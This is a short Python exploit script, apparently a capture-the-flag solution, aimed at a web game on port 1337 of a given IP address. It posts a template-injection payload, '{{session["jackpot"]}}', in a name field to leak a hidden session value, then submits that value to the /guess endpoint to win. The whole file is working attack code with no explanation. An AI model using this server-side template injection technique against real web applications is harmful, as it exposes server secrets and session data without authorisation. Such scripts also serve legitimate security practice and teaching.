import requests
url = "http://34.126.74.16:1337/"
url_guess = "http://34.126.74.16:1337/guess"
r = requests.Session()
res = r.get(url)
res = r.post(url, data={"name":'{{session["jackpot"]}}','ok':'Go'})
res = r.post(url_guess, data = {"jackpot" : None})
jackpot = res.text.replace("Pls Don't cheat! ", "")
print(jackpot)
res = r.post(url_guess, data = {"jackpot" : jackpot})
print(res.text)
r.close()